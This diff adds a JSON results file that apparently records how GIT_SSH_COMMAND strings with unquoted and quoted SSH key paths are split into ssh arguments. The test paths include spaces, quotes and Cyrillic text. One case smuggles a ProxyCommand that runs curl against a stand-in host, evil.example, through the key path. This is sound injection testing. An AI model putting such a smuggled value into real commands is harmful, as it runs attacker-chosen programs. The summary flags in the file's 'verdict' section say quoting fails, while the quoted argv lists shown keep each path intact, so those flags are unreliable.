@@ -1,0 +1,367 @@
+{
+  "cases": {
+    "plain_abs": {
+      "key_path": "/home/user/.ssh/id_vault",
+      "unquoted": {
+        "git_ssh_command": "ssh -i /home/user/.ssh/id_vault -o IdentitiesOnly=yes -o StrictHostKeyChecking=accept-new",
+        "rc": 128,
+        "stderr": "fatal: Could not read from remote repository.\n\nPlease make sure you have the correct access rights\nand the repository exists.\n",
+        "stdout": "",
+        "spy_argv": [
+          "-i",
+          "/home/user/.ssh/id_vault",
+          "-o",
+          "IdentitiesOnly=yes",
+          "-o",
+          "StrictHostKeyChecking=accept-new",
+          "-o",
+          "SendEnv=GIT_PROTOCOL",
+          "git@github.com",
+          "git-upload-pack 'fake/fake.git'"
+        ]
+      },
+      "quoted": {
+        "git_ssh_command": "ssh -i /home/user/.ssh/id_vault -o IdentitiesOnly=yes -o StrictHostKeyChecking=accept-new",
+        "rc": 128,
+        "stderr": "fatal: Could not read from remote repository.\n\nPlease make sure you have the correct access rights\nand the repository exists.\n",
+        "stdout": "",
+        "spy_argv": [
+          "-i",
+          "/home/user/.ssh/id_vault",
+          "-o",
+          "IdentitiesOnly=yes",
+          "-o",
+          "StrictHostKeyChecking=accept-new",
+          "-o",
+          "SendEnv=GIT_PROTOCOL",
+          "git@github.com",
+          "git-upload-pack 'fake/fake.git'"
+        ]
+      }
+    },
+    "with_space": {
+      "key_path": "/home/user/my keys/id_vault",
+      "unquoted": {
+        "git_ssh_command": "ssh -i /home/user/my keys/id_vault -o IdentitiesOnly=yes -o StrictHostKeyChecking=accept-new",
+        "rc": 128,
+        "stderr": "fatal: Could not read from remote repository.\n\nPlease make sure you have the correct access rights\nand the repository exists.\n",
+        "stdout": "",
+        "spy_argv": [
+          "-i",
+          "/home/user/my",
+          "keys/id_vault",
+          "-o",
+          "IdentitiesOnly=yes",
+          "-o",
+          "StrictHostKeyChecking=accept-new",
+          "-o",
+          "SendEnv=GIT_PROTOCOL",
+          "git@github.com",
+          "git-upload-pack 'fake/fake.git'"
+        ]
+      },
+      "quoted": {
+        "git_ssh_command": "ssh -i '/home/user/my keys/id_vault' -o IdentitiesOnly=yes -o StrictHostKeyChecking=accept-new",
+        "rc": 128,
+        "stderr": "fatal: Could not read from remote repository.\n\nPlease make sure you have the correct access rights\nand the repository exists.\n",
+        "stdout": "",
+        "spy_argv": [
+          "-i",
+          "/home/user/my keys/id_vault",
+          "-o",
+          "IdentitiesOnly=yes",
+          "-o",
+          "StrictHostKeyChecking=accept-new",
+          "-o",
+          "SendEnv=GIT_PROTOCOL",
+          "git@github.com",
+          "git-upload-pack 'fake/fake.git'"
+        ]
+      }
+    },
+    "with_apostrophe": {
+      "key_path": "/home/user/don't/id_vault",
+      "unquoted": {
+        "git_ssh_command": "ssh -i /home/user/don't/id_vault -o IdentitiesOnly=yes -o StrictHostKeyChecking=accept-new",
+        "rc": 128,
+        "stderr": "ssh -i /home/user/don't/id_vault -o IdentitiesOnly=yes -o StrictHostKeyChecking=accept-new: -c: line 0: unexpected EOF while looking for matching `''\nssh -i /home/user/don't/id_vault -o IdentitiesOnly=yes -o StrictHostKeyChecking=accept-new: -c: line 1: syntax error: unexpected end of file\nfatal: Could not read from remote repository.\n\nPlease make sure you have the correct access rights\nand the repository exists.\n",
+        "stdout": "",
+        "spy_argv": null
+      },
+      "quoted": {
+        "git_ssh_command": "ssh -i '/home/user/don'\"'\"'t/id_vault' -o IdentitiesOnly=yes -o StrictHostKeyChecking=accept-new",
+        "rc": 128,
+        "stderr": "fatal: Could not read from remote repository.\n\nPlease make sure you have the correct access rights\nand the repository exists.\n",
+        "stdout": "",
+        "spy_argv": [
+          "-i",
+          "/home/user/don't/id_vault",
+          "-o",
+          "IdentitiesOnly=yes",
+          "-o",
+          "StrictHostKeyChecking=accept-new",
+          "-o",
+          "SendEnv=GIT_PROTOCOL",
+          "git@github.com",
+          "git-upload-pack 'fake/fake.git'"
+        ]
+      }
+    },
+    "with_doublequote": {
+      "key_path": "/home/user/foo\"bar/id_vault",
+      "unquoted": {
+        "git_ssh_command": "ssh -i /home/user/foo\"bar/id_vault -o IdentitiesOnly=yes -o StrictHostKeyChecking=accept-new",
+        "rc": 128,
+        "stderr": "ssh -i /home/user/foo\"bar/id_vault -o IdentitiesOnly=yes -o StrictHostKeyChecking=accept-new: -c: line 0: unexpected EOF while looking for matching `\"'\nssh -i /home/user/foo\"bar/id_vault -o IdentitiesOnly=yes -o StrictHostKeyChecking=accept-new: -c: line 1: syntax error: unexpected end of file\nfatal: Could not read from remote repository.\n\nPlease make sure you have the correct access rights\nand the repository exists.\n",
+        "stdout": "",
+        "spy_argv": null
+      },
+      "quoted": {
+        "git_ssh_command": "ssh -i '/home/user/foo\"bar/id_vault' -o IdentitiesOnly=yes -o StrictHostKeyChecking=accept-new",
+        "rc": 128,
+        "stderr": "fatal: Could not read from remote repository.\n\nPlease make sure you have the correct access rights\nand the repository exists.\n",
+        "stdout": "",
+        "spy_argv": [
+          "-i",
+          "/home/user/foo\"bar/id_vault",
+          "-o",
+          "IdentitiesOnly=yes",
+          "-o",
+          "StrictHostKeyChecking=accept-new",
+          "-o",
+          "SendEnv=GIT_PROTOCOL",
+          "git@github.com",
+          "git-upload-pack 'fake/fake.git'"
+        ]
+      }
+    },
+    "with_cyrillic": {
+      "key_path": "/home/user/\u043a\u043b\u044e\u0447/id_vault",
+      "unquoted": {
+        "git_ssh_command": "ssh -i /home/user/\u043a\u043b\u044e\u0447/id_vault -o IdentitiesOnly=yes -o StrictHostKeyChecking=accept-new",
+        "rc": 128,
+        "stderr": "fatal: Could not read from remote repository.\n\nPlease make sure you have the correct access rights\nand the repository exists.\n",
+        "stdout": "",
+        "spy_argv": [
+          "-i",
+          "/home/user/\u043a\u043b\u044e\u0447/id_vault",
+          "-o",
+          "IdentitiesOnly=yes",
+          "-o",
+          "StrictHostKeyChecking=accept-new",
+          "-o",
+          "SendEnv=GIT_PROTOCOL",
+          "git@github.com",
+          "git-upload-pack 'fake/fake.git'"
+        ]
+      },
+      "quoted": {
+        "git_ssh_command": "ssh -i '/home/user/\u043a\u043b\u044e\u0447/id_vault' -o IdentitiesOnly=yes -o StrictHostKeyChecking=accept-new",
+        "rc": 128,
+        "stderr": "fatal: Could not read from remote repository.\n\nPlease make sure you have the correct access rights\nand the repository exists.\n",
+        "stdout": "",
+        "spy_argv": [
+          "-i",
+          "/home/user/\u043a\u043b\u044e\u0447/id_vault",
+          "-o",
+          "IdentitiesOnly=yes",
+          "-o",
+          "StrictHostKeyChecking=accept-new",
+          "-o",
+          "SendEnv=GIT_PROTOCOL",
+          "git@github.com",
+          "git-upload-pack 'fake/fake.git'"
+        ]
+      }
+    },
+    "injection_attempt": {
+      "key_path": "/tmp/id_vault -o ProxyCommand=curl http://evil.example",
+      "unquoted": {
+        "git_ssh_command": "ssh -i /tmp/id_vault -o ProxyCommand=curl http://evil.example -o IdentitiesOnly=yes -o StrictHostKeyChecking=accept-new",
+        "rc": 128,
+        "stderr": "fatal: Could not read from remote repository.\n\nPlease make sure you have the correct access rights\nand the repository exists.\n",
+        "stdout": "",
+        "spy_argv": [
+          "-i",
+          "/tmp/id_vault",
+          "-o",
+          "ProxyCommand=curl",
+          "http://evil.example",
+          "-o",
+          "IdentitiesOnly=yes",
+          "-o",
+          "StrictHostKeyChecking=accept-new",
+          "-o",
+          "SendEnv=GIT_PROTOCOL",
+          "git@github.com",
+          "git-upload-pack 'fake/fake.git'"
+        ]
+      },
+      "quoted": {
+        "git_ssh_command": "ssh -i '/tmp/id_vault -o ProxyCommand=curl http://evil.example' -o IdentitiesOnly=yes -o StrictHostKeyChecking=accept-new",
+        "rc": 128,
+        "stderr": "fatal: Could not read from remote repository.\n\nPlease make sure you have the correct access rights\nand the repository exists.\n",
+        "stdout": "",
+        "spy_argv": [
+          "-i",
+          "/tmp/id_vault -o ProxyCommand=curl http://evil.example",
+          "-o",
+          "IdentitiesOnly=yes",
+          "-o",
+          "StrictHostKeyChecking=accept-new",
+          "-o",
+          "SendEnv=GIT_PROTOCOL",
+          "git@github.com",
+          "git-upload-pack 'fake/fake.git'"
+        ]
+      }
+    }
+  },
+  "verdict": {
+    "plain_abs": {
+      "unquoted_argv": [
+        "-i",
+        "/home/user/.ssh/id_vault",
+        "-o",
+        "IdentitiesOnly=yes",
+        "-o",
+        "StrictHostKeyChecking=accept-new",
+        "-o",
+        "SendEnv=GIT_PROTOCOL",
+        "git@github.com",
+        "git-upload-pack 'fake/fake.git'"
+      ],
+      "quoted_argv": [
+        "-i",
+        "/home/user/.ssh/id_vault",
+        "-o",
+        "IdentitiesOnly=yes",
+        "-o",
+        "StrictHostKeyChecking=accept-new",
+        "-o",
+        "SendEnv=GIT_PROTOCOL",
+        "git@github.com",
+        "git-upload-pack 'fake/fake.git'"
+      ],
+      "quoted_preserves_path_as_single_arg": false
+    },
+    "with_space": {
+      "unquoted_argv": [
+        "-i",
+        "/home/user/my",
+        "keys/id_vault",
+        "-o",
+        "IdentitiesOnly=yes",
+        "-o",
+        "StrictHostKeyChecking=accept-new",
+        "-o",
+        "SendEnv=GIT_PROTOCOL",
+        "git@github.com",
+        "git-upload-pack 'fake/fake.git'"
+      ],
+      "quoted_argv": [
+        "-i",
+        "/home/user/my keys/id_vault",
+        "-o",
+        "IdentitiesOnly=yes",
+        "-o",
+        "StrictHostKeyChecking=accept-new",
+        "-o",
+        "SendEnv=GIT_PROTOCOL",
+        "git@github.com",
+        "git-upload-pack 'fake/fake.git'"
+      ],
+      "quoted_preserves_path_as_single_arg": false
+    },
+    "with_apostrophe": {
+      "unquoted_argv": null,
+      "quoted_argv": [
+        "-i",
+        "/home/user/don't/id_vault",
+        "-o",
+        "IdentitiesOnly=yes",
+        "-o",
+        "StrictHostKeyChecking=accept-new",
+        "-o",
+        "SendEnv=GIT_PROTOCOL",
+        "git@github.com",
+        "git-upload-pack 'fake/fake.git'"
+      ],
+      "quoted_preserves_path_as_single_arg": false
+    },
+    "with_doublequote": {
+      "unquoted_argv": null,
+      "quoted_argv": [
+        "-i",
+        "/home/user/foo\"bar/id_vault",
+        "-o",
+        "IdentitiesOnly=yes",
+        "-o",
+        "StrictHostKeyChecking=accept-new",
+        "-o",
+        "SendEnv=GIT_PROTOCOL",
+        "git@github.com",
+        "git-upload-pack 'fake/fake.git'"
+      ],
+      "quoted_preserves_path_as_single_arg": false
+    },
+    "with_cyrillic": {
+      "unquoted_argv": [
+        "-i",
+        "/home/user/\u043a\u043b\u044e\u0447/id_vault",
+        "-o",
+        "IdentitiesOnly=yes",
+        "-o",
+        "StrictHostKeyChecking=accept-new",
+        "-o",
+        "SendEnv=GIT_PROTOCOL",
+        "git@github.com",
+        "git-upload-pack 'fake/fake.git'"
+      ],
+      "quoted_argv": [
+        "-i",
+        "/home/user/\u043a\u043b\u044e\u0447/id_vault",
+        "-o",
+        "IdentitiesOnly=yes",
+        "-o",
+        "StrictHostKeyChecking=accept-new",
+        "-o",
+        "SendEnv=GIT_PROTOCOL",
+        "git@github.com",
+        "git-upload-pack 'fake/fake.git'"
+      ],
+      "quoted_preserves_path_as_single_arg": false
+    },
+    "injection_attempt": {
+      "unquoted_split_into_separate_args": true,
+      "quoted_keeps_payload_as_single_i_argument": false,
+      "quoted_argv": [
+        "-i",
+        "/tmp/id_vault -o ProxyCommand=curl http://evil.example",
+        "-o",
+        "IdentitiesOnly=yes",
+        "-o",
+        "StrictHostKeyChecking=accept-new",
+        "-o",
+        "SendEnv=GIT_PROTOCOL",
+        "git@github.com",
+        "git-upload-pack 'fake/fake.git'"
+      ],
+      "unquoted_argv": [
+        "-i",
+        "/tmp/id_vault",
+        "-o",
+        "ProxyCommand=curl",
+        "http://evil.example",
+        "-o",
+        "IdentitiesOnly=yes",
+        "-o",
+        "StrictHostKeyChecking=accept-new",
+        "-o",
+        "SendEnv=GIT_PROTOCOL",
+        "git@github.com",
+        "git-upload-pack 'fake/fake.git'"
+      ]
+    }
+  }
+}
